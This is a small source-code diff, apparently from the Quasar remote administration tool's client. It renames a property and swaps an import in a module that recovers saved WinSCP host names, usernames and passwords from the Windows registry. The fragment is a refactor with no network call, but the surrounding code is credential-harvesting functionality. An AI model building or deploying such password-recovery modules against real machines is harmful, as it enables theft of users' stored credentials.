@@ -1,8 +1,8 @@
 ﻿using Microsoft.Win32;
+using Quasar.Common.Models;
 using System;
 using System.Collections.Generic;
 using System.Linq;
-using xClient.Core.Data;
 using xClient.Core.Extensions;
 using xClient.Core.Helper;
 
@@ -37,7 +37,7 @@ namespace xClient.Core.Recovery.FtpClients
 
                             data.Add(new RecoveredAccount
                             {
-                                URL = host,
+                                Url = host,
                                 Username = user,
                                 Password = password,
                                 Application = "WinSCP"
